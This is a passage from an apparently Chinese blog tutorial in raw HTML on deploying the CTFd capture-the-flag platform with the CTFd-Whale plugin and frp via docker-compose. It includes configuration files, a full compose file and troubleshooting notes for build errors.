data-num=\"7\"></td><td><pre>vhost_http_port = 8001  # frps 映射http类型题目的端口</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>token = your_token</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>subdomain_host = node3.buuoj.cn  # 访问http题目容器的主机名，需要配置泛解析域名</pre></td></tr></table></figure><p><strong>之后部署时需要把注释内容全部删除，否则会报错。</strong></p>\n<ol start=\"4\">\n<li>配置 frpc，同样修改 docker-compose.yml</li>\n</ol>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>services:</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">..</span>.</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    frpc:</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        image: glzjin/frp:latest</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        restart: always</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        volumes:</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>          - ./conf/frp:/conf/</pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        entrypoint:</pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>          - /usr/local/bin/frpc</pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>          - <span class=\"token parameter variable\">-c</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>          - /conf/frpc.ini</pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        depends_on:</pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>          - frps <span class=\"token comment\">#frps 需要先成功运行</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        networks:</pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            frp_containers:  <span class=\"token comment\"># 供 frpc 访问题目容器</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            frp_connect:  <span class=\"token comment\"># 供 frpc 访问 frps, CTFd 访问 frpc</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>                ipv4_address: <span class=\"token number\">172.1</span>.0.4</pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>networks:</pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token punctuation\">..</span>.</pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    frp_containers:</pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        driver: overlay</pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        internal: <span class=\"token boolean\">true</span>  <span class=\"token comment\"># 如果允许题目容器访问外网，则可以去掉</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        attachable: <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        ipam:</pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>            config:</pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>                - subnet: <span class=\"token number\">172.2</span>.0.0/16</pre></td></tr></table></figure><ol start=\"5\">\n<li>创建./conf/frp/frpc.ini，填写：</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">[</span>common<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>token <span class=\"token operator\">=</span> your_token</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>server_addr <span class=\"token operator\">=</span> <span class=\"token number\">172.1</span><span class=\"token number\">.0</span><span class=\"token number\">.3</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>server_port <span class=\"token operator\">=</span> <span class=\"token number\">7987</span>  <span class=\"token comment\"># 对应 frps 的 bind_port</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>admin_addr <span class=\"token operator\">=</span> <span class=\"token number\">172.1</span><span class=\"token number\">.0</span><span class=\"token number\">.4</span>  <span class=\"token comment\"># 请参考 “安全事项”</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>admin_port <span class=\"token operator\">=</span> <span class=\"token number\">7400</span></pre></td></tr></table></figure><ol start=\"6\">\n<li>检查 frp 配置是否正确</li>\n</ol>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">docker-compose</span> up <span class=\"token parameter variable\">-d</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">docker-compose</span> logs frpc</pre></td></tr></table></figure><p>查看日志是否正确，正确情况如下：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">[</span>service<span class=\"token punctuation\">.</span>go<span class=\"token punctuation\">:</span><span class=\"token number\">224</span><span class=\"token punctuation\">]</span> login to server success<span class=\"token punctuation\">,</span> get run <span class=\"token builtin\">id</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">**</span><span class=\"token operator\">**</span><span class=\"token operator\">**</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> server udp port <span class=\"token punctuation\">[</span><span class=\"token operator\">**</span><span class=\"token operator\">**</span><span class=\"token operator\">**</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">[</span>service<span class=\"token punctuation\">.</span>go<span class=\"token punctuation\">:</span><span class=\"token number\">109</span><span class=\"token punctuation\">]</span> admin server listen on <span class=\"token operator\">**</span><span class=\"token operator\">**</span><span class=\"token operator\">**</span></pre></td></tr></table></figure><ol start=\"6\">\n<li>配置 CTFd</li>\n</ol>\n<figure class=\"highlight dockerfile\"><figcaption data-lang=\"Docker\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>services:</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    ctfd:</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        ...</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        volumes:</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            - /var/run/docker.sock:/var/run/docker.sock</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        depends_on:</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            - frpc #frpc需要先运行</pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        networks:</pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            ...</pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            frp_connect:</pre></td></tr></table></figure><p>照着修改 docker-compose.yml 即可。</p>\n<ol start=\"7\">\n<li>下载 CTFd-Whale</li>\n</ol>\n<figure class=\"highlight dockerfile\"><figcaption data-lang=\"Docker\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>git clone https://github.com/frankli0324/CTFd-Whale CTFd/plugins/ctfd-whale --depth=1</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>docker-compose build # 需要安装依赖</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>docker-compose up -d</pre></td></tr></table></figure><ol start=\"8\">\n<li>配置 ctfd-whale</li>\n</ol>\n<p>1. Auto Connect Network：ctfd_frp_containers</p>\n<p>2. Http Domain Suffix：设置好的泛解析域名</p>\n<p>3. Http Port：同 frps.ini 的 vhost_http_port</p>\n<p>4. Direct IP Address：公网 ip</p>\n<p>设置完成后理论上应该就成功了。</p>\n<p>完整的 docker-compose.tml:</p>\n<figure class=\"highlight dockerfile\"><figcaption data-lang=\"Docker\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>version: '3'</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>services:</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  ctfd:</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    build: .</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    user: root</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    restart: always</pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    ports:</pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      - \"8000:8000\"</pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    environment:</pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      - UPLOAD_FOLDER=/var/uploads</pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      - DATABASE_URL=mysql+pymysql://ctfd:ctfd@db/ctfd</pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>      - REDIS_URL=redis://cache:6379</pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>      - WORKERS=1</pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>      - LOG_FOLDER=/var/log/CTFd</pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>      - ACCESS_LOG=-</pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>      - ERROR_LOG=-</pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>      - REVERSE_PROXY=true</pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    volumes:</pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>      - .data/CTFd/logs:/var/log/CTFd</pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>      - .data/CTFd/uploads:/var/uploads</pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>      - .:/opt/CTFd:ro</pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>      - /var/run/docker.sock:/var/run/docker.sock</pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    depends_on:</pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>      - db</pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>      - frpc</pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    networks:</pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        default:</pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        internal:</pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        frp_connect:</pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>          ipv4_address: 172.1.0.5</pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>  nginx:</pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    image: nginx:1.17</pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    restart: always</pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    volumes:</pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>      - ./conf/nginx/http.conf:/etc/nginx/nginx.conf</pre></td></tr><tr><td data-num=\"74\"></td><td><pre></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>    ports:</pre></td></tr><tr><td data-num=\"76\"></td><td><pre></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>      - 80:80</pre></td></tr><tr><td data-num=\"78\"></td><td><pre></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    depends_on:</pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>      - ctfd</pre></td></tr><tr><td data-num=\"82\"></td><td><pre></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>  db:</pre></td></tr><tr><td data-num=\"86\"></td><td><pre></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>    image: mariadb:10.4.12</pre></td></tr><tr><td data-num=\"88\"></td><td><pre></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>    restart: always</pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>    environment:</pre></td></tr><tr><td data-num=\"92\"></td><td><pre></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>      - MYSQL_ROOT_PASSWORD=ctfd</pre></td></tr><tr><td data-num=\"94\"></td><td><pre></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>      - MYSQL_USER=ctfd</pre></td></tr><tr><td data-num=\"96\"></td><td><pre></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>      - MYSQL_PASSWORD=ctfd</pre></td></tr><tr><td data-num=\"98\"></td><td><pre></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>      - MYSQL_DATABASE=ctfd</pre></td></tr><tr><td data-num=\"100\"></td><td><pre></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>    volumes:</pre></td></tr><tr><td data-num=\"102\"></td><td><pre></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>      - .data/mysql:/var/lib/mysql</pre></td></tr><tr><td data-num=\"104\"></td><td><pre></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>    networks:</pre></td></tr><tr><td data-num=\"106\"></td><td><pre></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>        internal:</pre></td></tr><tr><td data-num=\"108\"></td><td><pre></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>    # This command is required to set important mariadb defaults</pre></td></tr><tr><td data-num=\"110\"></td><td><pre></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>    command: [mysqld, --character-set-server=utf8mb4, --collation-server=utf8mb4_unicode_ci, --wait_timeout=28800, --log-warnings=0]</pre></td></tr><tr><td data-num=\"112\"></td><td><pre></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"114\"></td><td><pre></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>  cache:</pre></td></tr><tr><td data-num=\"116\"></td><td><pre></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>    image: redis:4</pre></td></tr><tr><td data-num=\"118\"></td><td><pre></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>    restart: always</pre></td></tr><tr><td data-num=\"120\"></td><td><pre></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>    volumes:</pre></td></tr><tr><td data-num=\"122\"></td><td><pre></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>    - .data/redis:/data</pre></td></tr><tr><td data-num=\"124\"></td><td><pre></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>    networks:</pre></td></tr><tr><td data-num=\"126\"></td><td><pre></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>        internal:</pre></td></tr><tr><td data-num=\"128\"></td><td><pre></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>  frps:</pre></td></tr><tr><td data-num=\"130\"></td><td><pre></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>        image: glzjin/frp</pre></td></tr><tr><td data-num=\"132\"></td><td><pre></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>        restart: always</pre></td></tr><tr><td data-num=\"134\"></td><td><pre></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>        volumes:</pre></td></tr><tr><td data-num=\"136\"></td><td><pre></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>            - ./conf/frp:/conf</pre></td></tr><tr><td data-num=\"138\"></td><td><pre></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>        entrypoint:</pre></td></tr><tr><td data-num=\"140\"></td><td><pre></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>            - /usr/local/bin/frps</pre></td></tr><tr><td data-num=\"142\"></td><td><pre></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>            - -c</pre></td></tr><tr><td data-num=\"144\"></td><td><pre></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>            - /conf/frps.ini</pre></td></tr><tr><td data-num=\"146\"></td><td><pre></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>        ports:</pre></td></tr><tr><td data-num=\"148\"></td><td><pre></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>            - 10000-10100:10000-10100  # 映射direct类型题目的端口</pre></td></tr><tr><td data-num=\"150\"></td><td><pre></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>            - 8001:8001  # 映射http类型题目的端口</pre></td></tr><tr><td data-num=\"152\"></td><td><pre></pre></td></tr><tr><td data-num=\"153\"></td><td><pre>        networks:</pre></td></tr><tr><td data-num=\"154\"></td><td><pre></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>            default:  # 需要将frps暴露到公网以正常访问题目容器</pre></td></tr><tr><td data-num=\"156\"></td><td><pre></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>            frp_connect:</pre></td></tr><tr><td data-num=\"158\"></td><td><pre></pre></td></tr><tr><td data-num=\"159\"></td><td><pre>              ipv4_address: 172.1.0.3</pre></td></tr><tr><td data-num=\"160\"></td><td><pre></pre></td></tr><tr><td data-num=\"161\"></td><td><pre>  frpc:</pre></td></tr><tr><td data-num=\"162\"></td><td><pre></pre></td></tr><tr><td data-num=\"163\"></td><td><pre>        image: glzjin/frp:latest</pre></td></tr><tr><td data-num=\"164\"></td><td><pre></pre></td></tr><tr><td data-num=\"165\"></td><td><pre>        restart: always</pre></td></tr><tr><td data-num=\"166\"></td><td><pre></pre></td></tr><tr><td data-num=\"167\"></td><td><pre>        volumes:</pre></td></tr><tr><td data-num=\"168\"></td><td><pre></pre></td></tr><tr><td data-num=\"169\"></td><td><pre>          - ./conf/frp:/conf/</pre></td></tr><tr><td data-num=\"170\"></td><td><pre></pre></td></tr><tr><td data-num=\"171\"></td><td><pre>        entrypoint:</pre></td></tr><tr><td data-num=\"172\"></td><td><pre></pre></td></tr><tr><td data-num=\"173\"></td><td><pre>          - /usr/local/bin/frpc</pre></td></tr><tr><td data-num=\"174\"></td><td><pre></pre></td></tr><tr><td data-num=\"175\"></td><td><pre>          - -c</pre></td></tr><tr><td data-num=\"176\"></td><td><pre></pre></td></tr><tr><td data-num=\"177\"></td><td><pre>          - /conf/frpc.ini</pre></td></tr><tr><td data-num=\"178\"></td><td><pre></pre></td></tr><tr><td data-num=\"179\"></td><td><pre>        depends_on:</pre></td></tr><tr><td data-num=\"180\"></td><td><pre></pre></td></tr><tr><td data-num=\"181\"></td><td><pre>          - frps #frps需要先成功运行</pre></td></tr><tr><td data-num=\"182\"></td><td><pre></pre></td></tr><tr><td data-num=\"183\"></td><td><pre>        networks:</pre></td></tr><tr><td data-num=\"184\"></td><td><pre></pre></td></tr><tr><td data-num=\"185\"></td><td><pre>            frp_containers:  # 供frpc访问题目容器</pre></td></tr><tr><td data-num=\"186\"></td><td><pre></pre></td></tr><tr><td data-num=\"187\"></td><td><pre>            frp_connect:  # 供frpc访问frps, CTFd访问frpc</pre></td></tr><tr><td data-num=\"188\"></td><td><pre></pre></td></tr><tr><td data-num=\"189\"></td><td><pre>                ipv4_address: 172.1.0.4</pre></td></tr><tr><td data-num=\"190\"></td><td><pre></pre></td></tr><tr><td data-num=\"191\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"192\"></td><td><pre></pre></td></tr><tr><td data-num=\"193\"></td><td><pre>networks:</pre></td></tr><tr><td data-num=\"194\"></td><td><pre></pre></td></tr><tr><td data-num=\"195\"></td><td><pre>    default:</pre></td></tr><tr><td data-num=\"196\"></td><td><pre></pre></td></tr><tr><td data-num=\"197\"></td><td><pre>    internal:</pre></td></tr><tr><td data-num=\"198\"></td><td><pre></pre></td></tr><tr><td data-num=\"199\"></td><td><pre>        internal: true</pre></td></tr><tr><td data-num=\"200\"></td><td><pre></pre></td></tr><tr><td data-num=\"201\"></td><td><pre>    frp_connect:</pre></td></tr><tr><td data-num=\"202\"></td><td><pre></pre></td></tr><tr><td data-num=\"203\"></td><td><pre>        driver: overlay</pre></td></tr><tr><td data-num=\"204\"></td><td><pre></pre></td></tr><tr><td data-num=\"205\"></td><td><pre>        internal: true</pre></td></tr><tr><td data-num=\"206\"></td><td><pre></pre></td></tr><tr><td data-num=\"207\"></td><td><pre>        ipam:</pre></td></tr><tr><td data-num=\"208\"></td><td><pre></pre></td></tr><tr><td data-num=\"209\"></td><td><pre>            config:</pre></td></tr><tr><td data-num=\"210\"></td><td><pre></pre></td></tr><tr><td data-num=\"211\"></td><td><pre>                - subnet: 172.1.0.0/16</pre></td></tr><tr><td data-num=\"212\"></td><td><pre></pre></td></tr><tr><td data-num=\"213\"></td><td><pre>    frp_containers:</pre></td></tr><tr><td data-num=\"214\"></td><td><pre></pre></td></tr><tr><td data-num=\"215\"></td><td><pre>        driver: overlay</pre></td></tr><tr><td data-num=\"216\"></td><td><pre></pre></td></tr><tr><td data-num=\"217\"></td><td><pre>        internal: true  # 如果允许题目容器访问外网，则可以去掉</pre></td></tr><tr><td data-num=\"218\"></td><td><pre></pre></td></tr><tr><td data-num=\"219\"></td><td><pre>        attachable: true</pre></td></tr><tr><td data-num=\"220\"></td><td><pre></pre></td></tr><tr><td data-num=\"221\"></td><td><pre>        ipam:</pre></td></tr><tr><td data-num=\"222\"></td><td><pre></pre></td></tr><tr><td data-num=\"223\"></td><td><pre>            config:</pre></td></tr><tr><td data-num=\"224\"></td><td><pre></pre></td></tr><tr><td data-num=\"225\"></td><td><pre>                - subnet: 172.2.0.0/16</pre></td></tr></table></figure><h1 id=\"遇到的问题\"><a class=\"anchor\" href=\"#遇到的问题\">#</a> 遇到的问题</h1>\n<h2 id=\"部署时提示找不到python和python-dev\"><a class=\"anchor\" href=\"#部署时提示找不到python和python-dev\">#</a> 部署时提示找不到 python 和 python-dev</h2>\n<figure class=\"highlight dockerfile\"><figcaption data-lang=\"Docker\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ERROR: unable to select packages:</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    required by: world[python]</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  python-dev (no such package):</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    required by: world[python-dev]</pre></td></tr></table></figure><p>修改 python 和 python-dev 为 python3 和 python3-dev</p>\n<h2 id=\"编译时提示cannot-execute-cc1plus\"><a class=\"anchor\" href=\"#编译时提示cannot-execute-cc1plus\">#</a> 编译时提示 cannot execute 'cc1plus'</h2>\n<p>Dockerfile 中添加安装 g++</p>\n<figure class=\"highlight dockerfile\"><figcaption data-lang=\"Docker\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token instruction\"><span class=\"token keyword\">RUN</span> sed -i <span class=\"token string\">'s/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g'</span> /etc/apk/repositories &amp;&amp; <span class=\"token operator\">\\</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    apk update &amp;&amp; <span class=\"token operator\">\\</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    apk add <span class=\"token operator\">\\</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        ...</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        g++ \\</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        ...</pre></td></tr></table></figure><h2 id=\"docker-ps正常但无法进入网站\"><a class=\"anchor\" href=\"#docker-ps正常但无法进入网站\">#</a> docker ps 正常但无法进入网站</h2>\n<p>docker logs 容器 id 显示</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>/usr/local/lib/python3.7/site-packages/tzlocal/unix.py:158: UserWarning: Can not <span class=\"token function\">find</span> any timezone configuration, defaulting to UTC.</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  warnings.warn<span class=\"token punctuation\">(</span><span class=\"token string\">'Can not find any timezone configuration, defaulting to UTC.'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Starting CTFd</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>/usr/local/lib/python3.7/importlib/_bootstrap.py:219: RuntimeWarning: greenlet.greenlet size changed, may indicate binary incompatibility. Expected <span class=\"token number\">144</span> from C header, got <span class=\"token number\">152</span> from PyObject</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token builtin class-name\">return</span> f<span class=\"token punctuation\">(</span>*args, **kwds<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>/usr/local/lib/python3.7/importlib/_bootstrap.py:219: RuntimeWarning: greenlet.greenlet size changed, may indicate binary incompatibility. Expected <span class=\"token number\">144</span> from C header, got <span class=\"token number\">152</span> from PyObject</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token builtin class-name\">return</span> f<span class=\"token punctuation\">(</span>*args, **kwds<span class=\"token 